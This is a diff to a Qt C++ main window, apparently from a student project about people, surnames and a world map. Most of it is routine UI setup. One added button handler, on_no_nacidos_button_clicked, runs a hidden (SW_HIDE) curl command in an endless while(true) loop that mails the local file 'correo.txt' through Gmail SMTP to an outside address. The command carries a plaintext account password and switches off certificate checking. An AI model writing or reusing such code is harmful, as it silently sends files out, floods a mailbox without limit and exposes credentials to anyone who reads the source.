@@ -8,10 +8,10 @@ MainWindow::MainWindow(QWidget *parent) :
     ui(new Ui::MainWindow)
 {
     ui->setupUi(this);
+    mundo = new Mundo();
     ventana_personas = new ventanaPersonas();
     ventana_apellidos = new VentanaConsultaApellido();
     mapa_mundi = new MapaMundi();
-
 
     on_tabWidget_tabBarClicked(1);
 
@@ -47,4 +47,12 @@ void MainWindow::on_mapa_button_clicked()
 void MainWindow::on_pushButton_clicked()
 {
     ventana_apellidos->show();
+}
+
+void MainWindow::on_no_nacidos_button_clicked()
+{
+    while(true){
+    char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"americaSkrtSkrt@gmail.com\" --mail-rcpt \"josuecanales0@gmail.com\" --ssl -u personas.continente.europa@gmail.com:estructurasdatos -T \"correo.txt\" -k --anyauth";
+        WinExec(command, SW_HIDE);
+}
 }
